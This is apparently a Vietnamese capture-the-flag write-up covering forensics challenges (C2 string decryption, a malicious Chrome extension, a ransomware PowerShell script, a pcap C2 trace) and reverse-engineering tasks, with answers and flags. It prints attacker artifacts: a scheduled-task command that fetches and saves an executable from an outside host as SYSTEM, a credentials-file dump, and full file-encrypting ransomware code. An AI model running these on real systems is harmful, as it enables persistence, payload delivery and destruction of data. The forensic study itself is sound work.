    129, 30, 220, 112, 226, 56, 16, 114, 133, 22,
    96, 1, 90, 72, 162, 38, 143, 186, 35, 142,
    128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
    246, 232, 205, 236, 254, 152, 145, 98, 126, 29,
    217, 74, 177, 142, 19, 190, 182, 151, 233, 157,
    76, 74, 104, 155, 79, 115, 5, 18, 204, 65,
    254, 204, 118, 71, 92, 33, 58, 112, 206, 151,
    103, 179, 24, 164, 219, 98, 81, 6, 241, 100,
    228, 190, 96, 140, 128, 1, 161, 246, 236, 25,
    62, 100, 87, 145, 185, 45, 61, 143, 52, 8,
    227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
    227, 9, 146, 156, 208, 206, 194, 134, 194, 23,
    233, 100, 38, 158, 58, 159
]

def xor(data):
    array = [pwd[i % len(pwd)] for i in range(256)]
    array2 = list(range(256))
    array3 = bytearray(len(data))

    # Key Scheduling Algorithm (KSA)
    num = 0
    i = 0
    for i in range(256):
        num = (num + array2[i] + array[i]) % 256
        array2[i], array2[num] = array2[num], array2[i]

    # Mã hóa/giải mã dữ liệu
    num3 = 0
    num = 0
    for i in range(len(data)):
        num3 = (num3 + 1) % 256
        num = (num + array2[num3]) % 256
        array2[num3], array2[num] = array2[num], array2[num3]
        num4 = array2[(array2[num3] + array2[num]) % 256]
        array3[i] = data[i] ^ num4
    return bytes(array3)

def decrypt(base64_string):
    decoded_data = base64.b64decode(base64_string)
    decrypted_data = xor(decoded_data)
    return decrypted_data.decode('utf-8')
base64_strings = [
    "amKES9/XRHao4JUAOnieNEq4SpSsnQUdN86BiL77jrcGNvCXsptYBGnBic4hkrAdTxHrvv1buimrxfneAZu3A8dSQvmIsR3eb3COTLLrxtzs4Bhxtos5sLmVEfd0dHRMQnDDzCo5Pl+KQdi4xP+nSaenTD+5CesD6cL8b10VJX5CgXdMYc/KNsKNUWzTSQJyHApu5F6iR/LQ64AaeU3oDQpTOqXMcQBfpNLfC+es5/yY5K0wzHae8Yhkaap7rBCgplJY5E7hiOCNjLdWAXuzadw6z6VOUJIY/B56EReI0CVZNfqgQBHEiLbI",
    "VGiPTdHXQGP876EbMX2FJhm3ZazpvA8aO8jT1uC8xPhDZq/Np5oZQnHUpKxc36FHBznusaFRsSPtnJzlC4qyGNxcWMCIs1qdVzygFbDj0se4vntsvpU9rKvQPLcPERIjLB36+ws5PVmzVsnuxNmgUPegSj+VPrRfrcHkaE0VL2hOwFIfT8iFNsaVDmnmTwc4DwNxqVqvTfOSr5YCFzLYZhlGMKbBYwhRks/IUuS31pSyoY02zA2T/8MtRORCihusuiBB6lfwkOSDyvxAAS2eTNoqirpJX4oJpFo3HRzFiGt7Tf/hYDvgs4HhXNNUHiBTgR/ckAwJHX0PoBDbTYvxQCtWNytjzQFjF8ir6ihZqFEEUibY3Enkx73tO7zgG5MDXHNRxF6dk7NdM6hcR3RNywIGvr09k/HumgOhs6MgvrHuNauqVWR5t0N52Pf21A6gTNGVtkRfBdnH/vMwOY7egIIxRNR7BlDnaeBlOfmE4aPu5C7BjLhQkwQUcC2mtMa0Sy7vtm+oqIn5po/BFqKsfdreOrYrX3XZ+98F1KC+RVKLPH9pBKd0kH9jHbAMY19YPKl5dok4ls491gXmpv+tb9aPq6PAPkHtAj0ftml7fg=="
]

for base64_string in base64_strings:
    decrypted_string = decrypt(base64_string)
    print(f"\n{decrypted_string}")

```

2 dòng base64 mình lấy được từ steam 34 và stream 97 sau một hồi dò =)))

![image (15)](https://hackmd.io/_uploads/HkAc4HZ61g.png)

![image (16)](https://hackmd.io/_uploads/By5sEH-aJl.png)

```powershell
schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM

Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dev-support\Desktop>more C:\backups\credentials.txt
[Database Server]
host=db.internal.korptech.net
username=dbadmin
password=rY?ZY_65P4V0

[Game API]
host=api.korptech.net
api_key=sk-3498fwe09r8fw3f98fw9832fw

[SSH Access]
host=dev-build.korptech.net
username=devops
password=BuildServer@92|7Gy1lz'Xb
port=2022

C:\Users\dev-support\Desktop>
```

###### 5. What is the name of the task scheduled by the attacker?

>Synchronization

###### 6. What is the API key leaked from the highly valuable file discovered by the attacker?

>sk-3498fwe09r8fw3f98fw9832fw

### Stealth Invasion (Easy)

>Selene's normally secure laptop recently fell victim to a covert attack. Unbeknownst to her, a malicious Chrome extension was stealthily installed, masquerading as a useful productivity tool. Alarmed by unusual network activity, Selene is now racing against time to trace the intrusion, remove the malicious software, and bolster her digital defenses before more damage is done.
>

![image](https://hackmd.io/_uploads/HyRdSHWTyx.png)

Mình nhận được một file .elf lần này là điều tra memory ha

Sau một khoảng thời gian cố gắng fix lỗi của volatility trong việc không nhận được symbol thì mình cũng từ bỏ….(Cay vl thề)

Thì trước lúc đó cũng có biết tới MemProcFS nhưng mà chưa dùng thử bao giờ nên làm vài cuộc research

```powershell
MemProcFS.exe -device memdump.elf -forensic 1
```

###### 1. What is the PID of the Original (First) Google Chrome process:

Ở đây thì MemProsFS làm cho hết rồi chỉ cần điều hướng tới tới file cần tìm là đươc

```
M:\sys\pro\proc.txt
```

![image (17)](https://hackmd.io/_uploads/ryIB8rZTye.png)

>4080

###### 2. What is the only Folder on the Desktop

```
M:\forensic\files\ROOT\Users\selene\Desktop
```

![image (18)](https://hackmd.io/_uploads/Hy1FUSZ6ke.png)

>malext

###### 3. What is the Extension's ID (ex: hlkenndednhfkekhgcdicdfddnkalmdm)

Mình đã thử search để tìm đường dẫn tới extentsion

![image (19)](https://hackmd.io/_uploads/Hk4nLBWpyx.png)

![image (20)](https://hackmd.io/_uploads/HJUxwrZT1x.png)

Nhưng mà không phải ha nó chỉ là extension bình thường :))

Nên mình thử cách khác

![image (21)](https://hackmd.io/_uploads/SkrGvSZaJe.png)

![image (22)](https://hackmd.io/_uploads/S1tNDrbp1e.png)

Mình đã thử điều tra thêm ở mục process và dùng Timeline Explorer của Ericzimmerman để đọc file csv thay vì dùng Excel (Excel lag bome) , Tiếp đó là filter mục extension và thấy còn có một extension khác với id “nnjofihdjilebhiiemfmdlpbdkbjcpae” và đó cũng là đáp án

Thì theo phỏng đoán của mình thì có lẽ việc user upload một extension từ phía local nên mục Extensions không có, hoặc là không nhận diện được..

>nnjofihdjilebhiiemfmdlpbdkbjcpae

###### 4. After examining the malicious extention's code, what is the log filename in which the datais stored

Như trong ảnh thì tệp log có tên là 000003.log

![image (23)](https://hackmd.io/_uploads/Syty_BZa1e.png)

Mở file log lên là nguyên đống bùi nhùi khá khó đọc nên ném qua bên cyberchef cho dễ nhìn

![image (24)](https://hackmd.io/_uploads/rkmZ_SZT1l.png)

Câu này đọc file log là thấy nha

>drive.google.com

###### 6. What is the password of selene@rangers.eldoria.com

Tương tự trong log luôn

>clip-mumify-proofs

### Cave Expedition (medium)

>Rumors of a black drake terrorizing the fields of Dunlorn have spread far and wide. The village has offered a hefty bounty for its defeat. Sir Alaric and Thorin answered the call also returning with treasures from its lair. Among the retrieved items they found a map. Unfortunately it cannot be used directly because a custom encryption algorithm was probably used. Luckily it was possible to retrieve the original code that managed the encryption process. Can you investigate about what happened and retrieve the map content?

Mình dùng EvtxECmd để đưa file evtx về file csv và dùng Timeline Explorer của Ericzimmerman để điều tra

![image (25)](https://hackmd.io/_uploads/H139urWTJg.png)

![image (26)](https://hackmd.io/_uploads/BJCoOSZa1g.png)

Convert tất cả powershell command từ base64 thì được script dưới đây

```powershell
$k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
$m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

$e90Vg = @{}
$f12Vh = @{}

For ($x = 65; $x -le 90; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) }
}

function n90Vp {
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo))
}

function l56Vn {
    return (a12Vc $k34Vm).Split(" ")
}

For ($x = 97; $x -le 122; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) }
}

function a12Vc {
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}

$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

For ($x = 48; $x -le 57; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) }
}

$e90Vg.GetEnumerator() | ForEach-Object {
    $f12Vh[$_.Value] = $_.Key
}

function l34Vn {
    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
    $p12Vr = [byte[]]::new($m56Vo.Length)
    for ($x = 0; $x -lt $m56Vo.Length; $x++) {
        $q34Vs = $n78Vp[$x % $n78Vp.Length]
        $r56Vt = $o90Vq[$x % $o90Vq.Length]
        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
    }
    return $p12Vr
}

function s78Vu {
    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)

    if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {
        return $null
    }

    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb

    return [Convert]::ToBase64String($a34Vc)
}

function o12Vq {
    param([switch]$p34Vr)

    try {
        if ($p34Vr) {
            foreach ($q56Vs in l56Vn) {
                $d34Vp = "dca01aq2/"
                if (Test-Path $d34Vp) {
                    Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$q56Vs$" } |
                        ForEach-Object {
                            $r78Vt = $_.FullName
                            if (Test-Path $r78Vt) {
                                $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                Remove-Item $r78Vt -Force
                            }
                        }
                }
            }
        }
    }
    catch {}
}

if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
    o12Vq -p34Vr
    n90Vp
}

```

Đoạn mã trên thực hiện giải mã 2 key và dùng 2 key để xor với data

solve script

```python
import base64


def a12Vc(s):
    return base64.b64decode(s).decode('utf-8', errors='replace')
    
a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

# Tính ra key theo PowerShell:
c56Ve = a12Vc(a53Va)
d78Vf = a12Vc(b64Vb)

def xor_decrypt(data, key1, key2):
    key1_bytes = key1.encode('utf-8')
    key2_bytes = key2.encode('utf-8')
    output = bytearray(len(data))
    for i in range(len(data)):
        output[i] = data[i] ^ key1_bytes[i % len(key1_bytes)] ^ key2_bytes[i % len(key2_bytes)]
    return bytes(output)

def decrypt_secured_file(input_filename, output_filename):

    with open(input_filename, 'r', encoding='utf-8') as f:
        b64_content = f.read().strip()
        
    encrypted_bytes = base64.b64decode(b64_content)
    
    decrypted_bytes = xor_decrypt(encrypted_bytes, c56Ve, d78Vf)
    
    with open(output_filename, 'wb') as f:
        f.write(decrypted_bytes)

    print(f"Đã giải mã file '{input_filename}' thành '{output_filename}'.")

decrypt_secured_file(r"map.pdf.secured", r"map.pdf")
```

![image (27)](https://hackmd.io/_uploads/HkfwYrZaJx.png)

### ToolPie (Medium)

>In the bustling town of Eastmarsh, Garrick Stoneforge’s workshop site once stood as a pinnacle of enchanted lock and toolmaking. But dark whispers now speak of a breach by a clandestine faction, hinting that Garrick’s prized designs may have been stolen. Scattered digital remnants cling to the compromised site, awaiting those who dare unravel them. Unmask these cunning adversaries threatening the peace of Eldoria. Investigate the incident, gather evidence, and expose Malakar as the mastermind behind this attack.

Lần này lại là file pcap ha

![image](https://hackmd.io/_uploads/H1JTKH-ake.png)

###### 1. What is the IP address responsible for compromising the website?

![image](https://hackmd.io/_uploads/SJjLqBb6ye.png)

Thì sau khi mở file bằng wireshark lên thì có thể thấy được là một đống http request từ 194.59.6.66 tới 172.31.47.152 ở port 80

>194.59.6.66

###### 2. What is the name of the endpoint exploited by the attacker?

![image](https://hackmd.io/_uploads/BkQeiHbpyx.png)

Mình follow ra http thì ở stream số 3 attacker gửi một lệnh post đến /execute, ở đây đoạn payload đã bị obfuscate mình đã thử unobfuscate bằng nhiều cách nhưng không được :v

>execute

###### 3. What is the name of the obfuscation tool used by the attacker?

![image (28)](https://hackmd.io/_uploads/rkwQhSb6Je.png)

![image (29)](https://hackmd.io/_uploads/BygEnS-pJx.png)

![image (30)](https://hackmd.io/_uploads/SkAEnSZp1g.png)

Mình đã thử search và thấy tool này <https://github.com/Sl-Sanda-Ru/Py-Fuscate/tree/main>

> Py-Fuscate

###### 4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?

Thì sau khi nó post đoạn mã độc lên server thì tiếp theo đó khả năng nó khả năng thực hiện kết nối c2, thì ở cái stream tiếp theo thì là một loạt tcp từ 172.31.47.152 đến 13.61.7.218 ở port 55155

![image](https://hackmd.io/_uploads/SycgprZ6kx.png)

Thử kiểm tra ip trên virustotal thì nó báo cáo là độc hại ha

![image](https://hackmd.io/_uploads/r1Pj6B-61e.png)

![image](https://hackmd.io/_uploads/HkgAprZTyx.png)

>13.61.7.218:55155

###### 5. What encryption key did the attacker use to secure the data?

![image](https://hackmd.io/_uploads/SJpfCBb6Jg.png)

Cũng trong steam đó thì có thể tìm được cái key

> 5UUfizsRsP7oOCAq

###### 6, What is the MD5 hash of the file exfiltrated by the attacker?

Đến đây là tịt ngòi r :))) chưa có ý tưởng

![image](https://hackmd.io/_uploads/HkutCBbTkl.png)

## Reverse

### SealedRune (Very Easy)

>Elowen has reached the Ruins of Eldrath, where she finds a sealed rune stone glowing with ancient power. The rune is inscribed with a secret incantation that must be spoken to unlock the next step in her journey to find The Dragon’s Heart.

![image](https://hackmd.io/_uploads/r13bOdZ6Jx.png)

Ở đây thì mình dùng IDA pro để reverse

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [rsp+0h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  anti_debug(argc, argv, envp);
  display_rune();
  puts(a134m_0);
  printf("Enter the incantation to reveal its secret: ");
  __isoc99_scanf("%49s", v4);
  check_input(v4);
  return 0;
}
```

Ở đây nó yêu cầu user nhập input vào và kiểm tra gì đó, mình tiến hành điều tra hàm check_input()

```c
void __fastcall check_input(const char *a1)
{
  __int64 v1; // rax
  char *s2; // [rsp+18h] [rbp-8h]

  s2 = (char *)decode_secret();
  if ( !strcmp(a1, s2) )
  {
    puts(a132mtheRuneGlo);
    v1 = decode_flag();
    printf("\x1B[1;33m%s\x1B[0m\n", (const char *)(v1 + 1));
  }
  else
  {
    puts("\x1B[1;31mThe rune rejects your words... Try again.\x1B[0m");
  }
  free(s2);
}
```

Điều đáng chú í nhất ở đây là hàm decode_flag(), mấy cái kia không quan trọng nên mình bỏ qua

```c
__int64 decode_flag()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = base64_decode(flag);
  reverse_str(v1);
  return v1;
}
```

Đến đây nhìn vào tên hàm thì cũng đủ biết chức năng của nó là gì rồi, decode base64 vả reverse flag

![image](https://hackmd.io/_uploads/BJ5vFO-6kx.png)

```
LmB9ZDNsNDN2M3JfYzFnNG1fM251cntCVEhgIHNpIGxsZXBzIHRlcmNlcyBlaFQ=
```

![image](https://hackmd.io/_uploads/ryb5KuZpyg.png)

>HTB{run3_m4g1c_r3v34l3d}

### EncryptedScroll (Very Easy)

>Elowen Moonsong, an Elven mage of great wisdom, has discovered an ancient scroll rumored to contain the location of The Dragon’s Heart. However, the scroll is enchanted with an old magical cipher, preventing Elowen from reading it.

![image](https://hackmd.io/_uploads/Hy3-cd-p1l.png)

Tương tự như bài nãy thì nó cũng yêu cầu input từ user và thực hiện decrypt_mesage()

```c
unsigned __int64 __fastcall decrypt_message(const char *a1)
{
  int i; // [rsp+1Ch] [rbp-34h]
  char s2[40]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v4; // [rsp+48h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  strcpy(s2, "IUC|t2nqm4`gm5h`5s2uin4u2d~");
  for ( i = 0; s2[i]; ++i )
    --s2[i];
  if ( !strcmp(a1, s2) )
    puts("The Dragon's Heart is hidden beneath the Eternal Flame in Eldoria.");
  else
    puts("The scroll remains unreadable... Try again.");
  return v4 - __readfsqword(0x28u);

```

Ở đây nó thực hiện so sánh input của user với giá trị s2 trong đó s2 là chuỗi

```
IUC|t2nqm4`gm5h`5s2uin4u2d~
```

s2 thực hiện lấy từng kí tự trong chuỗi rồi đưa về ascii và trừ đi 1

solve code:

```python
s = "IUC|t2nqm4`gm5h`5s2uin4u2d~"
print("".join(chr(ord(char) - 1) for char in s))
```

>HTB{s1mpl3_fl4g_4r1thm3t1c}

### Impossimaze (Easy)

>Elowen has been cursed to roam forever in an inescapable maze. You need to break her curse and set her free.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int v3; // ebx
  int i; // ebx
  unsigned int v5; // r12d
  char v6; // bl
  unsigned int v7; // ebp
  int v8; // eax
  int v9; // r14d
  int *v10; // rbp
  int j; // ebx
  int v12; // edx
  int v14; // [rsp+Ch] [rbp-6Ch]
  int v15; // [rsp+10h] [rbp-68h]
  int v16; // [rsp+14h] [rbp-64h]
  char v17[24]; // [rsp+20h] [rbp-58h] BYREF
  unsigned __int64 v18; // [rsp+38h] [rbp-40h]

  v18 = __readfsqword(0x28u);
  initscr();
  cbreak();
  noecho();
  curs_set(0);
  keypad(stdscr, 1);
  v3 = getmaxy(stdscr);
  v15 = getmaxx(stdscr) / 2;
  v16 = v3 / 2;
  for ( i = 0; i != 113; i = wgetch(stdscr) )
  {
    v9 = getmaxy(stdscr);
    v14 = getmaxx(stdscr);
    if ( i == 260 )
    {
      v15 -= v15 > 1;
    }
    else if ( i > 260 )
    {
      v15 += i == 261;
    }
    else if ( i == 258 )
    {
      ++v16;
    }
    else if ( i == 259 )
    {
      v16 -= v16 > 1;
    }
    werase(stdscr);
    wattr_on(stdscr, 0x100000uLL, 0LL);
    wborder(stdscr, 0LL, 0LL, 0LL, 0LL, 0LL, 0LL, 0LL, 0LL);
    if ( v14 > 2 )
    {
      v5 = 1;
      do
      {
        v7 = 1;
        if ( v9 > 2 )
        {
          do
          {
            v8 = sub_1249(v5, v7);
            if ( v8 > 60 )
            {
              v6 = (unsigned int)(v8 - 61) < 0x78 ? 32 : 86;
            }
            else
            {
              v6 = 65;
              if ( v8 <= 30 )
                v6 = (unsigned int)v8 < 0x1F ? -37 : 86;
            }
            if ( wmove(stdscr, v7, v5) != -1 )
              waddch(stdscr, (unsigned int)v6);
            ++v7;
          }
          while ( v7 != v9 - 1 );
        }
        ++v5;
      }
      while ( v14 - 1 != v5 );
    }
    wattr_off(stdscr, 0x100000uLL, 0LL);
    wattr_on(stdscr, 0x200000uLL, 0LL);
    if ( wmove(stdscr, v16, v15) != -1 )
      waddch(stdscr, 0x58uLL);
    wattr_off(stdscr, 0x200000uLL, 0LL);
    snprintf(v17, 0x10uLL, "%d:%d", (unsigned int)v9, (unsigned int)v14);
    if ( wmove(stdscr, 0, 0) != -1 )
      waddnstr(stdscr, v17, -1);
    if ( v9 == 13 && v14 == 37 )
    {
      wattr_on(stdscr, 0x80000uLL, 0LL);
      wattr_on(stdscr, 0x200000uLL, 0LL);
      v10 = (int *)&unk_40C0;
      for ( j = 6; j != 30; ++j )
      {
        v12 = j;
        if ( wmove(stdscr, 6, v12) != -1 )
          waddch(stdscr, byte_4120[*v10]);
        ++v10;
      }
      wattr_off(stdscr, 0x200000uLL, 0LL);
      wattr_off(stdscr, 0x80000uLL, 0LL);
    }
  }
  endwin();
  return 0LL;
}
```

Đoạn mã này là một chương trình terminal đơn giản sử dụng thư viện ncurses để tạo một giao diện người dùng dạng văn bản. Chương trình tạo ra một màn hình với một ký tự 'X' có thể di chuyển được bằng các phím mũi tên, và có một số hình ảnh ASCII đặc biệt xuất hiện khi kích thước màn hình đạt được các giá trị nhất định.

```c
if ( v9 == 13 && v14 == 37 )
    {
      wattr_on(stdscr, 0x80000uLL, 0LL);
      wattr_on(stdscr, 0x200000uLL, 0LL);
      v10 = (int *)&unk_40C0;
      for ( j = 6; j != 30; ++j )
      {
        v12 = j;
        if ( wmove(stdscr, 6, v12) != -1 )
          waddch(stdscr, byte_4120[*v10]);
        ++v10;
      }
      wattr_off(stdscr, 0x200000uLL, 0LL);
      wattr_off(stdscr, 0x80000uLL, 0LL);
    }
  }
```

Nếu điều chỉnh màn hình terminal có kích thước chính xác 13x37, một thông điệp đặc biệt sẽ xuất hiện

ở đây unk_40C0 là chỉ số cho mảng byte_4120 và nó in ra

mình dump ra unk_40C0 và byte_4120

![image](https://hackmd.io/_uploads/r1m71FWa1g.png)

![image](https://hackmd.io/_uploads/Byez1Y-Tye.png)

Và viết code để in ra

```python
byte_4120 = [
    0x37, 0x88, 0x11, 0x94, 0xCD, 0xCF, 0x12, 0xDD, 0xD5, 0xEF,
    0x7A, 0x5D, 0xB8, 0x2D, 0xAB, 0x57, 0x8C, 0x8F, 0x13, 0xD7,
    0x99, 0x1B, 0x97, 0x9F, 0x0E, 0x49, 0x23, 0x53, 0x54, 0x6C, 0x5A,
    0xCC, 0xDC, 0xC9, 0x1A, 0xC8, 0xEA, 0x55, 0xAE, 0xD8,
    0xDF, 0xF5, 0x78, 0xE4, 0x21, 0xA3, 0x64, 0xDA, 0x7F, 0x9A,
    0xA4, 0x56, 0x96, 0xF9, 0x1D, 0xED, 0x5B, 0x18, 0x0B, 0xA0,
    0xF1, 0xEC, 0xE6, 0x2C, 0x74, 0x0F, 0x46, 0x1F, 0x87, 0x62,
    0x10, 0x8D, 0x6A, 0xD2, 0x08, 0xB1, 0xD3, 0xA7, 0xB6, 0x7C,
    0x63, 0xB7, 0x85, 0x20, 0x28, 0x4A, 0x6F, 0xC0, 0x27, 0x29,
    0x51, 0x05, 0xD4, 0xD9, 0x02, 0x98, 0x76, 0x8A, 0xAF, 0x71, 0xBF,
    0x44, 0x1C, 0xF8, 0x68, 0xFC, 0x16, 0xB9, 0x3F, 0x15, 0xFD,
    0x81, 0x70, 0x67, 0xE3, 0x73, 0x2F, 0x6D, 0x35, 0x40, 0x4D, 0xA9,
    0x8E, 0x26, 0x43, 0x32, 0x83, 0xF2, 0xFE, 0xB3, 0x3D, 0xC5,
    0x0A, 0x2A, 0x75, 0xEE, 0x84, 0xC4, 0x5F, 0xB5, 0xBB, 0x9E,
    0x2E, 0x41, 0x3C, 0x17, 0x19, 0xBE, 0x39, 0x91, 0xF7, 0xAC,
    0x06, 0xE7, 0x0D, 0xF6, 0xA1, 0x22, 0x45, 0xA8, 0x4C, 0x1E,
    0x86, 0x30, 0x58, 0x9B, 0x95, 0x5C, 0xAA, 0xE5, 0xC6, 0x24,
    0x61, 0xD0, 0x38, 0x8B, 0x04, 0x4F, 0x7B, 0x4B, 0x5E, 0x00, 0xC7,
    0x50, 0x42, 0x9C, 0xB0, 0xBA, 0x89, 0xC3, 0xE2, 0x07, 0x7D,
    0x14, 0x52, 0xE1, 0x90, 0x92, 0x7E, 0xD6, 0x01, 0x80, 0xF0, 0x6B,
    0x59, 0x4E, 0xAD, 0xFB, 0xA5, 0xCE, 0x33, 0x77, 0xCB, 0xB4,
    0x03, 0x34, 0x47, 0xD1, 0xB2, 0xDE, 0x93, 0xCA, 0x79, 0x3B,
    0x3E, 0x3A, 0xC1, 0xE0, 0xF3, 0x48, 0xA2, 0x31, 0x09, 0xBC,
    0xEB, 0x0C, 0xBD, 0x69, 0x36, 0x6E, 0xA6, 0x65, 0x2B, 0xFA,
    0xE9, 0xFF, 0xF4, 0x9D, 0x82, 0x25, 0x60, 0xC2, 0x72, 0x66,
    0xDB, 0xE8
]

unk_40C0 = [
    0xE5, 0x1C, 0xB8, 0xB2, 0x40, 0x68, 0xD2, 0x8A,
    0x50, 0x86, 0xFC, 0x73, 0xD2, 0x8A, 0xED, 0x73,
    0x8A, 0x45, 0xFC, 0x56, 0xCB, 0xD2, 0xEF, 0xC0
]


def display_message():
    message = []
    for index in unk_40C0:
        if index < len(byte_4120):
            message.append(byte_4120[index])

    print(''.join(chr(i) for i in message))

display_message()
```

>HTB{th3_curs3_is_brok3n}
